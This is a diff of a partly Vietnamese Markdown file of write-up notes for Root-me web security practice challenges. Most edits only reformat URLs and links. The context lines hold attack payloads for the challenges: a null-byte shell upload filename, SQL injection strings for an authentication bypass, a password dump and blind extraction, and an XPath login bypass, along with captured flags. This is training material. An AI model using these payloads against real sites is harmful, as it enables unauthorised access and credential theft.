@@ -1,4 +1,4 @@
-#Mục lục:
+#Mục lục
 
 >[1. HTML]
 
@@ -98,13 +98,13 @@
 
 [+] Vulnerable: upload nullbyte
 
-[+] File: [shell.php%00.jpg](../prog/shell.php%00.jpg)
+[+] File: [shell.php%00.jpg](Root-me/prog/shell.php%00.jpg)
 
 [+] Flag: `YPNchi2NmTwygr2dgCCF`
 <a name='16'></a>
 ##16. PHP filters 
 
-[+] URL: `http://challenge01.root-me.org/web-serveur/ch12/`
+[+] URL: <http://challenge01.root-me.org/web-serveur/ch12/>
 
 [+] Filter: 
  ```
@@ -118,7 +118,7 @@
 <a name="25"></a>
 ##25. SQL injection - authentication - GBK 
 
-[+] URL: `http://challenge01.root-me.org/web-serveur/ch42/`
+[+] URL: <http://challenge01.root-me.org/web-serveur/ch42/>
 
 [+] Sql injection: `login=%bf' or 1=1 -- -&password=abc`
 
@@ -130,7 +130,7 @@
 <a name="26"></a>
 ##26. SQL injection - string 
 
-[+] URL: `http://challenge01.root-me.org/web-serveur/ch19/?action=recherche`
+[+] URL: <http://challenge01.root-me.org/web-serveur/ch19/?action=recherche>
 
 [+] Sql injection: `' union select (select group_concat(username, password) from users),2  -- -`
 
@@ -140,21 +140,21 @@
 <a name='31'></a>
 ##31. SQL injection - numeric 
 
-[+] URL: `http://challenge01.root-me.org/web-serveur/ch18/`
+[+] URL: <http://challenge01.root-me.org/web-serveur/ch18/>
 
 [+] Sql injection: `1 or (select substr(group_concat(username, password),i,1) from users)=(select char(j))  -- -`
 
- [-] Trong đó: i là vị trí kí tự trong chuỗi trả về được cắt ra; j là mã ascii của kí tự bruteforce
+ - [-] `i` is index of subtring, `j` in decimal-unicode
 
 [+] Vulnerable: sql number query
 
-[+] code: [sqli-numberic.py](../prog/sqli-numberic.py)
+[+] code: [sqli-numberic.py](Root-me/prog/sqli-numberic.py)
 
 [+] flag: `aTlkJYLjcbLmue3`
 <a name="34"></a>
 ##34. XPath injection - authentication 
 
-[+] URL: `http://challenge01.root-me.org/web-serveur/ch23/`
+[+] URL: <http://challenge01.root-me.org/web-serveur/ch23/>
 
 [+] Sql injection: `username=John'+or+'1'='1&password=abc`
 
